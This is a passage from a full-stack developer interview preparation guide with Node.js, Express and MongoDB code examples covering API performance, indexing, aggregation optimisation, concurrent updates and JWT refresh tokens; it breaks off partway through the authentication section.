# Full Stack Developer Interview Preparation Guide
## Scenario-Based Questions with Real-Time Examples

---

## 📋 Table of Contents (Click to Jump)

### 🚀 Scenario 1: API Performance
| # | Question | Link |
|---|----------|------|
| Q1 | API returns 1 lakh records. How will you optimize it? | [Jump →](#q1-api-returns-1-lakh-100000-records-how-will-you-optimize-it) |
| Q2 | API response takes 15 seconds. What will you check? | [Jump →](#q2-api-response-takes-15-seconds-what-will-you-check) |
| Q3 | Database query is slow. How will you debug it? | [Jump →](#q3-database-query-is-slow-how-will-you-debug-it) |
| Q4 | How will you identify whether the issue is in Node.js or Database? | [Jump →](#q4-how-will-you-identify-whether-the-issue-is-in-nodejs-or-database) |
| Q5 | API is consuming high CPU. What steps will you take? | [Jump →](#q5-api-is-consuming-high-cpu-what-steps-will-you-take) |
| Q6 | API memory usage keeps increasing. What could be the reason? | [Jump →](#q6-api-memory-usage-keeps-increasing-what-could-be-the-reason) |
| Q7 | API works fine locally but is slow in production. How will you investigate? | [Jump →](#q7-api-works-fine-locally-but-is-slow-in-production-how-will-you-investigate) |

### 🗄️ Scenario 2: MongoDB
| # | Question | Link |
|---|----------|------|
| Q8 | Collection has 5 crore records. Search is slow. What will you do? | [Jump →](#q8-collection-has-5-crore-50-million-records-search-is-slow-what-will-you-do) |
| Q9 | Aggregation pipeline is taking 20 seconds. How will you optimize it? | [Jump →](#q9-aggregation-pipeline-is-taking-20-seconds-how-will-you-optimize-it) |
| Q10 | Which fields would you index and why? | [Jump →](#q10-which-fields-would-you-index-and-why) |
| Q11 | How do you identify missing indexes? | [Jump →](#q11-how-do-you-identify-missing-indexes) |
| Q12 | What happens if you create indexes on every field? | [Jump →](#q12-what-happens-if-you-create-indexes-on-every-field) |
| Q13 | Duplicate records are getting inserted. How will you prevent this? | [Jump →](#q13-duplicate-records-are-getting-inserted-how-will-you-prevent-this) |
| Q14 | Multiple users update the same document. How will you handle it? | [Jump →](#q14-multiple-users-update-the-same-document-at-the-same-time-how-will-you-handle-it) |

### 🔐 Scenario 3: Authentication
| # | Question | Link |
|---|----------|------|
| Q15 | JWT token expires while user is working. What should happen? | [Jump →](#q15-jwt-token-expires-while-the-user-is-working-what-should-happen) |
| Q16 | A user logs out. How will you invalidate the JWT? | [Jump →](#q16-a-user-logs-out-how-will-you-invalidate-the-jwt) |
| Q17 | Someone steals a JWT token. How can you reduce the impact? | [Jump →](#q17-someone-steals-a-jwt-token-how-can-you-reduce-the-impact) |
| Q18 | Admin should access only admin APIs. How will you implement it? | [Jump →](#q18-admin-should-access-only-admin-apis-how-will-you-implement-it) |
| Q19 | Users making requests without authentication. How will you secure? | [Jump →](#q19-users-are-making-requests-without-authentication-how-will-you-secure-the-apis) |

### 🛡️ Scenario 4: Security
| # | Question | Link |
|---|----------|------|
| Q20 | API receiving 10,000 requests/min from one IP. What will you do? | [Jump →](#q20-your-api-is-receiving-10000-requests-per-minute-from-one-ip-what-will-you-do) |
| Q21 | Someone trying SQL/NoSQL Injection. How will you prevent? | [Jump →](#q21-someone-is-trying-sqlnosql-injection-how-will-you-prevent-it) |
| Q22 | How do you protect against XSS attacks? | [Jump →](#q22-how-do-you-protect-against-xss-attacks) |
| Q23 | API exposed publicly. What security measures before deployment? | [Jump →](#q23-api-is-exposed-publicly-what-security-measures-will-you-implement-before-deployment) |
| Q24 | Passwords stored in plain text. How to migrate to hashed? | [Jump →](#q24-passwords-are-stored-in-plain-text-in-an-old-project-how-would-you-migrate-to-hashed-passwords) |

### 📁 Scenario 5: File Upload
| # | Question | Link |
|---|----------|------|
| Q25 | Users upload 5 GB videos. How will you handle them? | [Jump →](#q25-users-upload-5-gb-videos-how-will-you-handle-them) |
| Q26 | Users upload 100 images simultaneously. What problems? | [Jump →](#q26-users-upload-100-images-simultaneously-what-problems-can-occur) |
| Q27 | How will you validate uploaded files? | [Jump →](#q27-how-will-you-validate-uploaded-files) |
| Q28 | Where will you store uploaded files in AWS? | [Jump →](#q28-where-will-you-store-uploaded-files-in-aws) |
| Q29 | How will you generate unique file names? | [Jump →](#q29-how-will-you-generate-unique-file-names) |

### ⚙️ Scenario 6: Express.js
| # | Question | Link |
|---|----------|------|
| Q30 | Middleware is not getting executed. How will you debug it? | [Jump →](#q30-middleware-is-not-getting-executed-how-will-you-debug-it) |
| Q31 | A request never reaches the controller. What could be wrong? | [Jump →](#q31-a-request-never-reaches-the-controller-what-could-be-wrong) |
| Q32 | API always returns 500 error. How will you debug it? | [Jump →](#q32-api-always-returns-500-internal-server-error-how-will-you-debug-it) |
| Q33 | How do you implement centralized error handling? | [Jump →](#q33-how-do-you-implement-centralized-error-handling) |

### 🟢 Scenario 7: Node.js
| # | Question | Link |
|---|----------|------|
| Q34 | Server CPU suddenly reaches 100%. How will you investigate? | [Jump →](#q34-server-cpu-suddenly-reaches-100-how-will-you-investigate) |
| Q35 | Node.js server crashes every few hours. What will you check? | [Jump →](#q35-nodejs-server-crashes-every-few-hours-what-will-you-check-first) |
| Q36 | Application has a memory leak. How will you identify it? | [Jump →](#q36-the-application-has-a-memory-leak-how-will-you-identify-it) |
| Q37 | Long-running calculation blocks all requests. How to solve? | [Jump →](#q37-a-long-running-calculation-blocks-all-requests-how-would-you-solve-this) |
| Q38 | Third-party API taking 30 seconds. How to protect your app? | [Jump →](#q38-a-third-party-api-is-taking-30-seconds-to-respond-how-will-you-protect-your-application) |

### 🐳 Scenario 8: Docker
| # | Question | Link |
|---|----------|------|
| Q39 | Docker container starts and exits immediately. Reasons? | [Jump →](#q39-docker-container-starts-and-exits-immediately-what-are-the-possible-reasons) |
| Q40 | Container works locally but not on server. How to debug? | [Jump →](#q40-container-works-locally-but-not-on-the-server-how-will-you-debug-it) |
| Q41 | Environment variables missing inside container. What to check? | [Jump →](#q41-environment-variables-are-missing-inside-the-container-what-will-you-check) |

### ☁️ Scenario 9: AWS
| # | Question | Link |
|---|----------|------|
| Q42 | EC2 running but app not accessible. What will you check? | [Jump →](#q42-ec2-instance-is-running-but-the-application-is-not-accessible-what-will-you-check) |
| Q43 | Users cannot upload to S3. Possible reasons? | [Jump →](#q43-users-cannot-upload-files-to-s3-what-are-the-possible-reasons) |
| Q44 | CloudWatch shows high CPU. How will you proceed? | [Jump →](#q44-cloudwatch-shows-high-cpu-usage-how-will-you-proceed) |
| Q45 | App unavailable after deployment. What steps? | [Jump →](#q45-application-becomes-unavailable-after-deployment-what-steps-will-you-take) |

### 🔗 Scenario 10: Microservices
| # | Question | Link |
|---|----------|------|
| Q46 | One microservice is down. How will others behave? | [Jump →](#q46-one-microservice-is-down-how-will-other-services-behave) |
| Q47 | Notification service slow. Sync or async? Why? | [Jump →](#q47-notification-service-is-slow-will-you-call-it-synchronously-or-asynchronously-why) |
| Q48 | How will two microservices communicate securely? | [Jump →](#q48-how-will-two-microservices-communicate-securely) |
| Q49 | How to trace request through multiple microservices? | [Jump →](#q49-how-will-you-trace-a-request-that-passes-through-multiple-microservices) |

### ⚡ Scenario 11: Caching
| # | Question | Link |
|---|----------|------|
| Q50 | Product API gets 50,000 req/min. How to reduce DB load? | [Jump →](#q50-product-api-receives-50000-requests-per-minute-how-will-you-reduce-database-load) |
| Q51 | Cached data outdated. How to refresh/invalidate? | [Jump →](#q51-cached-data-becomes-outdated-how-will-you-refresh-or-invalidate-the-cache) |
| Q52 | Redis goes down. How should the app behave? | [Jump →](#q52-redis-goes-down-how-should-the-application-behave) |

### 📊 Scenario 12: Logging & Monitoring
| # | Question | Link |
|---|----------|------|
| Q53 | Production issue can't be reproduced locally. How to investigate? | [Jump →](#q53-production-issue-is-reported-but-no-one-can-reproduce-it-locally-how-will-you-investigate) |
| Q54 | Intermittent failures. Which logs/metrics to check? | [Jump →](#q54-users-report-intermittent-failures-which-logs-and-metrics-will-you-check) |
| Q55 | How to correlate logs across multiple services? | [Jump →](#q55-how-would-you-correlate-logs-across-multiple-services) |

### 🚢 Scenario 13: Deployment & CI/CD
| # | Question | Link |
|---|----------|------|
| Q56 | Deployment failed. What is your rollback strategy? | [Jump →](#q56-deployment-failed-in-production-what-is-your-rollback-strategy) |
| Q57 | Tests pass locally but fail in CI. What could be the reasons? | [Jump →](#q57-tests-pass-locally-but-fail-in-the-ci-pipeline-what-could-be-the-reasons) |
| Q58 | How to ensure zero downtime during deployment? | [Jump →](#q58-how-do-you-ensure-zero-or-minimal-downtime-during-deployment) |

### 📐 Scenario 14: API Design
| # | Question | Link |
|---|----------|------|
| Q59 | Introducing breaking API change. How to avoid affecting clients? | [Jump →](#q59-you-need-to-introduce-a-breaking-api-change-how-will-you-avoid-affecting-existing-clients) |
| Q60 | Two teams consume your API. How to maintain backward compatibility? | [Jump →](#q60-two-different-teams-consume-your-api-how-will-you-maintain-backward-compatibility) |

### 💼 Scenario 15: Project-Based Questions
| # | Question | Link |
|---|----------|------|
| Q61 | Explain one API you built from end to end | [Jump →](#q61-explain-one-api-you-built-from-end-to-end) |
| Q62 | Which part of your project are you most proud of? | [Jump →](#q62-which-part-of-your-project-are-you-most-proud-of-and-why) |
| Q63 | Most challenging production bug you fixed | [Jump →](#q63-tell-us-about-the-most-challenging-production-bug-you-fixed) |
| Q64 | How did you optimize one slow API? | [Jump →](#q64-how-did-you-optimize-one-slow-api-in-your-project) |
| Q65 | Describe your application's architecture | [Jump →](#q65-describe-your-applications-architecture) |
| Q66-Q70 | Authentication, Deployment, Monitoring, Exceptions, Redesign | [Jump →](#q66-q70-quick-answers) |

### 🎁 Bonus: Additional Questions
| # | Question | Link |
|---|----------|------|
| Q71 | Event Loop in Node.js | [Jump →](#q71-what-is-the-event-loop-in-nodejs-explain-with-example) |
| Q72 | SQL vs NoSQL. When to use which? | [Jump →](#q72-difference-between-sql-and-nosql-when-to-use-which) |
| Q73 | Design Patterns in Node.js | [Jump →](#q73-what-are-design-patterns-youve-used-in-nodejs) |
| Q74 | Garbage Collection in Node.js | [Jump →](#q74-how-does-garbage-collection-work-in-nodejs) |
| Q75 | REST API best practices | [Jump →](#q75-explain-rest-api-best-practices) |
| Q76 | Monolithic vs Microservices | [Jump →](#q76-what-is-the-difference-between-monolithic-and-microservices-architecture) |
| Q77 | Database migrations in production | [Jump →](#q77-how-do-you-handle-database-migrations-in-production) |
| Q78 | WebSocket vs REST | [Jump →](#q78-explain-websocket-vs-rest-when-to-use-which) |
| Q79 | Environment-specific configurations | [Jump →](#q79-how-do-you-handle-environment-specific-configurations) |
| Q80 | Horizontal vs Vertical Scaling | [Jump →](#q80-what-is-horizontal-vs-vertical-scaling) |
| Q81 | Virtual DOM | [Jump →](#q81-what-is-virtual-dom-and-how-does-it-work) |
| Q82 | useEffect vs useLayoutEffect | [Jump →](#q82-useeffect-vs-uselayouteffect) |
| Q83 | React performance optimization | [Jump →](#q83-how-do-you-optimize-react-performance) |
| Q84 | State management (Context vs Redux vs Zustand) | [Jump →](#q84-what-is-state-management-when-to-use-context-vs-redux-vs-zustand) |

---

[⬆ Back to Top](#-table-of-contents-click-to-jump)

---

<a id="scenario-1-api-performance"></a>
## Scenario 1: API Performance

<a id="q1-api-returns-1-lakh-100000-records-how-will-you-optimize-it"></a>
### Q1. API returns 1 lakh (100,000) records. How will you optimize it?

**Answer:**

Never return all records at once. Use these strategies:

1. **Pagination** (Most Important)
```javascript
// Cursor-based pagination (better for large datasets)
app.get('/api/products', async (req, res) => {
  const { lastId, limit = 50 } = req.query;
  
  const query = lastId ? { _id: { $gt: lastId } } : {};
  const products = await Product.find(query)
    .sort({ _id: 1 })
    .limit(parseInt(limit))
    .lean(); // .lean() returns plain JS objects, faster than Mongoose documents
  
  res.json({
    data: products,
    nextCursor: products.length ? products[products.length - 1]._id : null,
    hasMore: products.length === parseInt(limit)
  });
});
```

2. **Field Projection** – Return only needed fields
```javascript
const products = await Product.find({})
  .select('name price category') // Only these fields
  .lean();
```

3. **Compression** – Enable gzip
```javascript
const compression = require('compression');
app.use(compression()); // Reduces response size by 60-80%
```

4. **Caching** – Cache frequently accessed data
```javascript
const redis = require('redis');
const client = redis.createClient();

app.get('/api/products', async (req, res) => {
  const cached = await client.get('products:page:1');
  if (cached) return res.json(JSON.parse(cached));
  
  const products = await Product.find({}).limit(50).lean();
  await client.setEx('products:page:1', 3600, JSON.stringify(products));
  res.json(products);
});
```

5. **Streaming** – For very large exports
```javascript
app.get('/api/products/export', async (req, res) => {
  res.setHeader('Content-Type', 'application/json');
  res.write('[');
  
  const cursor = Product.find({}).cursor();
  let first = true;
  
  for await (const doc of cursor) {
    if (!first) res.write(',');
    res.write(JSON.stringify(doc));
    first = false;
  }
  
  res.write(']');
  res.end();
});
```

---

<a id="q2-api-response-takes-15-seconds-what-will-you-check"></a>
### Q2. API response takes 15 seconds. What will you check?

**Answer:**

Systematic debugging approach:

1. **Add timing logs at each layer:**
```javascript
app.get('/api/orders', async (req, res) => {
  const start = Date.now();
  
  // Check DB query time
  const dbStart = Date.now();
  const orders = await Order.find({ userId: req.user.id }).lean();
  console.log(`DB Query: ${Date.now() - dbStart}ms`);
  
  // Check processing time
  const processStart = Date.now();
  const enrichedOrders = await enrichOrders(orders);
  console.log(`Processing: ${Date.now() - processStart}ms`);
  
  // Check third-party API time
  const apiStart = Date.now();
  const shipping = await getShippingStatus(orders);
  console.log(`External API: ${Date.now() - apiStart}ms`);
  
  console.log(`Total: ${Date.now() - start}ms`);
  res.json(enrichedOrders);
});
```

2. **Common causes:**
   - Missing database indexes
   - N+1 query problem (querying inside a loop)
   - Slow third-party API calls
   - Large payload serialization
   - Unoptimized aggregation pipelines
   - Network latency between app and DB

3. **Use APM tools:** New Relic, Datadog, or custom middleware
```javascript
// Simple performance monitoring middleware
app.use((req, res, next) => {
  const start = process.hrtime.bigint();
  res.on('finish', () => {
    const duration = Number(process.hrtime.bigint() - start) / 1e6;
    if (duration > 3000) {
      console.warn(`SLOW API: ${req.method} ${req.url} took ${duration}ms`);
    }
  });
  next();
});
```

---

<a id="q3-database-query-is-slow-how-will-you-debug-it"></a>
### Q3. Database query is slow. How will you debug it?

**Answer:**

```javascript
// 1. Use .explain() to analyze query execution
const result = await Product.find({ category: 'electronics', price: { $gt: 100 } })
  .explain('executionStats');

console.log(result.executionStats);
// Look for:
// - totalDocsExamined vs totalKeysExamined (should be close)
// - executionTimeMillis
// - stage: "COLLSCAN" means NO index is being used (BAD!)
// - stage: "IXSCAN" means index is used (GOOD!)
```

```javascript
// 2. Enable MongoDB Profiler for slow queries
// In mongo shell:
db.setProfilingLevel(1, { slowms: 100 }); // Log queries > 100ms
db.system.profile.find().sort({ ts: -1 }).limit(5);
```

```javascript
// 3. Common fixes:
// Bad: Querying without index
db.orders.find({ status: "pending", createdAt: { $gte: lastWeek } });

// Fix: Create compound index
db.orders.createIndex({ status: 1, createdAt: -1 });

// Bad: Using $regex with leading wildcard
db.products.find({ name: { $regex: ".*phone.*" } }); // Full collection scan!

// Fix: Use text index
db.products.createIndex({ name: "text" });
db.products.find({ $text: { $search: "phone" } });
```

---

<a id="q4-how-will-you-identify-whether-the-issue-is-in-nodejs-or-database"></a>
### Q4. How will you identify whether the issue is in Node.js or Database?

**Answer:**

```javascript
// Approach: Measure time at each boundary

const mongoose = require('mongoose');

// 1. Enable Mongoose debug mode
mongoose.set('debug', (collectionName, method, query, doc) => {
  console.log(`${collectionName}.${method}`, JSON.stringify(query));
});

// 2. Middleware to separate DB time from processing time
app.get('/api/users', async (req, res) => {
  const timings = {};
  
  // DB Time
  let start = Date.now();
  const users = await User.find({ active: true }).lean();
  timings.db = Date.now() - start;
  
  // Node.js processing time
  start = Date.now();
  const result = users.map(user => ({
    ...user,
    fullName: `${user.firstName} ${user.lastName}`,
    age: calculateAge(user.dob)
  }));
  timings.processing = Date.now() - start;
  
  // Serialization time
  start = Date.now();
  const json = JSON.stringify(result);
  timings.serialization = Date.now() - start;
  
  console.log('Timings:', timings);
  // Output: { db: 2500, processing: 50, serialization: 200 }
  // Conclusion: DB is the bottleneck
  
  res.json(result);
});
```

**Quick test:** Run the raw query in MongoDB shell. If it's fast there but slow in app, the issue is in Node.js (data transformation, memory, etc.).

---

<a id="q5-api-is-consuming-high-cpu-what-steps-will-you-take"></a>
### Q5. API is consuming high CPU. What steps will you take?

**Answer:**

1. **Identify the bottleneck:**
```javascript
// Use clinic.js for profiling
// npm install -g clinic
// clinic doctor -- node server.js
// clinic flame -- node server.js  (generates flame graph)
```

2. **Common CPU-heavy operations:**
```javascript
// BAD: Synchronous JSON parsing of large files
const data = JSON.parse(fs.readFileSync('large-file.json'));

// GOOD: Stream parsing
const JSONStream = require('JSONStream');
const stream = fs.createReadStream('large-file.json')
  .pipe(JSONStream.parse('*'));

// BAD: Heavy computation on main thread
app.get('/api/report', (req, res) => {
  const result = generateComplexReport(data); // Blocks event loop!
  res.json(result);
});

// GOOD: Offload to worker thread
const { Worker } = require('worker_threads');

app.get('/api/report', (req, res) => {
  const worker = new Worker('./workers/report-generator.js', {
    workerData: { userId: req.user.id }
  });
  worker.on('message', (result) => res.json(result));
  worker.on('error', (err) => res.status(500).json({ error: err.message }));
});
```

3. **Check for infinite loops or recursive calls**
4. **Monitor with:** `process.cpuUsage()`, PM2, or `top` command

---

<a id="q6-api-memory-usage-keeps-increasing-what-could-be-the-reason"></a>
### Q6. API memory usage keeps increasing. What could be the reason?

**Answer:**

Common causes of memory leaks:

```javascript
// 1. BAD: Global arrays that keep growing
const requestLog = []; // Never cleaned!
app.use((req, res, next) => {
  requestLog.push({ url: req.url, time: new Date() });
  next();
});

// FIX: Use bounded data structure or external logging
const requestLog = [];
app.use((req, res, next) => {
  requestLog.push({ url: req.url, time: new Date() });
  if (requestLog.length > 1000) requestLog.splice(0, 500); // Keep last 500
  next();
});

// 2. BAD: Event listeners not removed
function setupConnection(socket) {
  socket.on('data', handleData);
  // If setupConnection is called multiple times, listeners accumulate!
}

// FIX: Remove listeners on disconnect
function setupConnection(socket) {
  socket.on('data', handleData);
  socket.on('close', () => socket.removeAllListeners());
}

// 3. BAD: Closures holding references
function processLargeData() {
  const hugeArray = new Array(1000000).fill('data');
  return function() {
    // This closure keeps hugeArray in memory forever
    return hugeArray.length;
  };
}

// 4. Debugging memory leaks:
// Take heap snapshots
const v8 = require('v8');
setInterval(() => {
  const usage = process.memoryUsage();
  console.log(`Heap: ${Math.round(usage.heapUsed / 1024 / 1024)}MB`);
  if (usage.heapUsed > 500 * 1024 * 1024) {
    v8.writeHeapSnapshot(); // Creates .heapsnapshot file
  }
}, 30000);
```

---

<a id="q7-api-works-fine-locally-but-is-slow-in-production-how-will-you-investigate"></a>
### Q7. API works fine locally but is slow in production. How will you investigate?

**Answer:**

| Factor | Local | Production |
|--------|-------|------------|
| Data volume | 100 records | 10 million records |
| Network | localhost | Cross-region |
| Concurrency | 1 user | 1000+ users |
| Resources | 16GB RAM | 2GB container |

**Investigation steps:**

```javascript
// 1. Check connection pooling
// Local: 1 connection is fine
// Production: Need pool
mongoose.connect(MONGO_URI, {
  maxPoolSize: 50,      // Allow 50 concurrent connections
  minPoolSize: 10,
  socketTimeoutMS: 45000,
  serverSelectionTimeoutMS: 5000
});

// 2. Check if DNS resolution is slow
const dns = require('dns');
const start = Date.now();
dns.resolve('your-db-host.com', (err, addresses) => {
  console.log(`DNS resolution: ${Date.now() - start}ms`);
});

// 3. Check environment differences
console.log('Node version:', process.version);
console.log('Available memory:', process.memoryUsage());
console.log('CPU cores:', require('os').cpus().length);
console.log('ENV:', process.env.NODE_ENV);

// 4. Check if production has proper indexes
// Indexes might exist locally but not in production DB

// 5. Network latency between app server and DB
// Use: ping, traceroute, or measure connection time
```

---

<a id="scenario-2-mongodb"></a>
## Scenario 2: MongoDB

<a id="q8-collection-has-5-crore-50-million-records-search-is-slow-what-will-you-do"></a>
### Q8. Collection has 5 crore (50 million) records. Search is slow. What will you do?

**Answer:**

```javascript
// 1. Proper Indexing (Most critical)
// If searching by email:
db.users.createIndex({ email: 1 });

// If searching by multiple fields:
db.users.createIndex({ city: 1, age: -1, createdAt: -1 });

// 2. Use covered queries (all fields from index, no document fetch)
db.users.find(
  { city: "Mumbai" },
  { _id: 0, city: 1, age: 1 } // Only indexed fields
).hint({ city: 1, age: -1 });

// 3. Partitioning / Sharding for 5 crore+ records
// Shard key selection is critical
sh.shardCollection("mydb.users", { city: "hashed" });

// 4. Use lean() and projection
const users = await User.find({ city: 'Delhi' })
  .select('name email phone')
  .lean()
  .limit(100);

// 5. Archive old data
// Move records older than 2 years to archive collection
const twoYearsAgo = new Date(Date.now() - 2 * 365 * 24 * 60 * 60 * 1000);
const oldRecords = await User.find({ lastLogin: { $lt: twoYearsAgo } });
await ArchivedUser.insertMany(oldRecords);
await User.deleteMany({ lastLogin: { $lt: twoYearsAgo } });

// 6. Text Search with Atlas Search (for full-text)
// Create Atlas Search index, then:
const results = await User.aggregate([
  { $search: { text: { query: "software engineer", path: "designation" } } },
  { $limit: 20 }
]);
```

---

<a id="q9-aggregation-pipeline-is-taking-20-seconds-how-will-you-optimize-it"></a>
### Q9. Aggregation pipeline is taking 20 seconds. How will you optimize it?

**Answer:**

```javascript
// BAD: Unoptimized pipeline
const result = await Order.aggregate([
  { $lookup: { from: 'users', localField: 'userId', foreignField: '_id', as: 'user' } },
  { $unwind: '$user' },
  { $match: { status: 'delivered', createdAt: { $gte: lastMonth } } }, // FILTER AFTER LOOKUP!
  { $group: { _id: '$user.city', totalRevenue: { $sum: '$amount' } } },
  { $sort: { totalRevenue: -1 } }
]);

// GOOD: Optimized pipeline
const result = await Order.aggregate([
  // 1. FILTER FIRST - reduce documents early
  { $match: { status: 'delivered', createdAt: { $gte: lastMonth } } },
  
  // 2. PROJECT only needed fields before lookup
  { $project: { userId: 1, amount: 1 } },
  
  // 3. LOOKUP after filtering
  { $lookup: { from: 'users', localField: 'userId', foreignField: '_id', as: 'user' } },
  { $unwind: '$user' },
  
  // 4. GROUP
  { $group: { _id: '$user.city', totalRevenue: { $sum: '$amount' } } },
  
  // 5. SORT and LIMIT
  { $sort: { totalRevenue: -1 } },
  { $limit: 10 }
]);

// Key Rules:
// - $match and $project as early as possible
// - Ensure $match uses indexed fields
// - Use allowDiskUse for large datasets
const result = await Order.aggregate(pipeline).option({ allowDiskUse: true });

// - Use $facet for multiple aggregations in one pass
const result = await Order.aggregate([
  { $match: { createdAt: { $gte: lastMonth } } },
  { $facet: {
    byStatus: [{ $group: { _id: '$status', count: { $sum: 1 } } }],
    byCity: [{ $group: { _id: '$city', revenue: { $sum: '$amount' } } }],
    total: [{ $count: 'count' }]
  }}
]);
```

---

<a id="q10-which-fields-would-you-index-and-why"></a>
### Q10. Which fields would you index and why?

**Answer:**

```javascript
// Rule: Index fields that appear in queries (filter, sort, join)

// 1. Fields used in WHERE/MATCH conditions
db.orders.createIndex({ status: 1 }); // Frequently filtered

// 2. Fields used in SORT
db.products.createIndex({ price: -1 }); // Sort by price descending

// 3. Compound indexes for combined queries
// Query: find orders by userId, sorted by date
db.orders.createIndex({ userId: 1, createdAt: -1 });

// 4. Unique fields
db.users.createIndex({ email: 1 }, { unique: true });

// 5. Fields used in JOIN ($lookup)
db.orders.createIndex({ userId: 1 }); // Foreign key equivalent

// 6. TTL index for auto-expiring documents
db.sessions.createIndex({ createdAt: 1 }, { expireAfterSeconds: 86400 });

// DON'T INDEX:
// - Fields with low cardinality (boolean, gender) unless compound
// - Fields rarely queried
// - Collections with heavy writes and few reads
```

---

<a id="q11-how-do-you-identify-missing-indexes"></a>
### Q11. How do you identify missing indexes?

**Answer:**

```javascript
// 1. MongoDB Profiler - finds slow queries
db.setProfilingLevel(1, { slowms: 100 });
db.system.profile.find({ millis: { $gt: 100 } }).sort({ ts: -1 });

// 2. explain() on suspected queries
const plan = await Order.find({ status: 'pending' }).explain('executionStats');
// If executionStats.totalDocsExamined >> executionStats.nReturned → missing index
// If winningPlan.stage === "COLLSCAN" → definitely missing index

// 3. MongoDB Atlas Performance Advisor (if using Atlas)
// Shows recommended indexes based on query patterns

// 4. Check existing indexes
db.orders.getIndexes();

// 5. Mongoose index warnings
mongoose.set('debug', true);
// In logs, look for queries scanning many documents

// 6. Use mongostat and mongotop
// mongostat shows operations per second
// mongotop shows time spent per collection
```

---

<a id="q12-what-happens-if-you-create-indexes-on-every-field"></a>
### Q12. What happens if you create indexes on every field?

**Answer:**

**Problems:**
- **Slow writes:** Every INSERT/UPDATE/DELETE must update ALL indexes
- **High storage:** Indexes consume RAM and disk (can be larger than data itself)
- **Diminished returns:** MongoDB can only use ONE index per query (usually)
- **Memory pressure:** Indexes must fit in RAM for optimal performance

```javascript
// Example: Collection with 10 fields, all indexed
// Document insert time comparison:
// 0 indexes: ~1ms
// 3 indexes: ~3ms  
// 10 indexes: ~10ms+ per insert

// For a write-heavy collection (like analytics/logs):
// 1 million inserts/day × 10ms extra = 10,000 seconds wasted!

// Best Practice: Only index what you query
// Use compound indexes instead of multiple single-field indexes
// One compound index can serve multiple query patterns:
db.orders.createIndex({ userId: 1, status: 1, createdAt: -1 });
// Serves: find by userId, find by userId+status, find by userId+status+date
```

---

<a id="q13-duplicate-records-are-getting-inserted-how-will-you-prevent-this"></a>
### Q13. Duplicate records are getting inserted. How will you prevent this?

**Answer:**

```javascript
// 1. Unique Index (Best approach)
// Prevents duplicate emails
db.users.createIndex({ email: 1 }, { unique: true });

// Compound unique index (no duplicate order per user per product)
db.orders.createIndex({ userId: 1, productId: 1 }, { unique: true });

// In Mongoose schema:
const userSchema = new mongoose.Schema({
  email: { type: String, unique: true, required: true },
  phone: { type: String, unique: true, sparse: true } // sparse allows multiple nulls
});

// 2. Handle duplicate error gracefully
async function createUser(data) {
  try {
    const user = await User.create(data);
    return user;
  } catch (error) {
    if (error.code === 11000) { // MongoDB duplicate key error
      throw new Error('User with this email already exists');
    }
    throw error;
  }
}

// 3. Upsert pattern (update if exists, insert if not)
await Order.findOneAndUpdate(
  { userId: user.id, productId: product.id }, // filter
  { $set: { quantity: 1, updatedAt: new Date() } }, // update
  { upsert: true, new: true } // options
);

// 4. Idempotency key for API requests
app.post('/api/payments', async (req, res) => {
  const { idempotencyKey, amount, userId } = req.body;
  
  const existing = await Payment.findOne({ idempotencyKey });
  if (existing) return res.json(existing); // Return existing, don't create duplicate
  
  const payment = await Payment.create({ idempotencyKey, amount, userId });
  res.json(payment);
});
```

---

<a id="q14-multiple-users-update-the-same-document-at-the-same-time-how-will-you-handle-it"></a>
### Q14. Multiple users update the same document at the same time. How will you handle it?

**Answer:**

```javascript
// Problem: Race condition / Lost update
// User A reads: { stock: 10 }
// User B reads: { stock: 10 }
// User A writes: { stock: 9 }  (bought 1)
// User B writes: { stock: 9 }  (bought 1) — should be 8!

// Solution 1: Atomic operations (Best for counters)
await Product.updateOne(
  { _id: productId, stock: { $gte: 1 } }, // Check stock > 0
  { $inc: { stock: -1 } } // Atomic decrement
);

// Solution 2: Optimistic Locking (version field)
const productSchema = new mongoose.Schema({
  name: String,
  price: Number,
  __v: { type: Number, select: true } // version key
});

async function updateProduct(id, updates, expectedVersion) {
  const result = await Product.findOneAndUpdate(
    { _id: id, __v: expectedVersion },
    { ...updates, $inc: { __v: 1 } },
    { new: true }
  );
  
  if (!result) {
    throw new Error('Conflict: Document was modified by another user. Please retry.');
  }
  return result;
}

// Solution 3: MongoDB Transactions (for multi-document updates)
const session = await mongoose.startSession();
session.startTransaction();

try {
  const product = await Product.findById(productId).session(session);
  if (product.stock < quantity) throw new Error('Insufficient stock');
  
  await Product.updateOne(
    { _id: productId },
    { $inc: { stock: -quantity } }
  ).session(session);
  
  await Order.create([{ userId, productId, quantity }], { session });
  
  await session.commitTransaction();
} catch (error) {
  await session.abortTransaction();
  throw error;
} finally {
  session.endSession();
}

// Solution 4: Distributed Lock (Redis)
const lock = await redlock.acquire([`lock:product:${productId}`], 5000);
try {
  // Only one process can execute this at a time
  await processOrder(productId, quantity);
} finally {
  await lock.release();
}
```

---

<a id="scenario-3-authentication"></a>
## Scenario 3: Authentication

<a id="q15-jwt-token-expires-while-the-user-is-working-what-should-happen"></a>
### Q15. JWT token expires while the user is working. What should happen?

**Answer:**

Implement **Refresh Token** strategy:

```javascript
// Login endpoint - Issue both access & refresh tokens
app.post('/api/auth/login', async (req, res) => {
  const { email, password } = req.body;
  const user = await User.findOne({ email });
  
  if (!user || !(await bcrypt.compare(password, user.password))) {
    return res.status(401).json({ message: 'Invalid credentials' });
  }
  
  // Short-lived access token (15 minutes)
  const accessToken = jwt.sign(
    { userId: user._id, role: user.role },
    process.env.JWT_SECRET,
    { expiresIn: '15m' }
  );
  
  // Long-lived refresh token (7 days)
  const refreshToken = jwt.sign(
    { userId: user._id },
    process.env.REFRESH_SECRET,
    { expiresIn: '7d' }
  );
  
  // Store refresh token in DB (for invalidation)
  await RefreshToken.create({ token: refreshToken, userId: user._id });
  
  // Send refresh token as HTTP-only cookie
  res.cookie('refreshToken', refreshToken, {
    httpOnly: true,
    secure: true,
    sameSite: 'strict',
    maxAge: 7 * 24 * 60 * 60 * 1000
  });
  
  res.json({ accessToken });
});

// Refresh endpoint
app.post('/api/auth/refresh', async (req, res) => {
  const { refreshToken } = req.cookies;
  
  if (!refreshToken) return res.status(401).json({ message: 'No refresh token' });
  
  // Check if token exists in DB (not invalidated)
  const storedToken = await RefreshToken.findOne({ token: refreshToken });
  if (!storedToken) return res.status(403).json({ message: 'Token revoked' });
  
  try {
    const decoded = jwt.verify(refreshToken, process.env.REFRESH_SECRET);
    
    const newAccessToken = jwt.sign(
      { userId: decoded.userId },
      process.env.JWT_SECRET,
      { expiresIn: '15m' }
    );
    
    res.json({ accessToken: newAccessToken });
  } catch (error) {
    return res.status(403).json({ message: 'Invalid refresh token' });
  }
});
```

**Frontend (Axios interceptor):**
```javascript
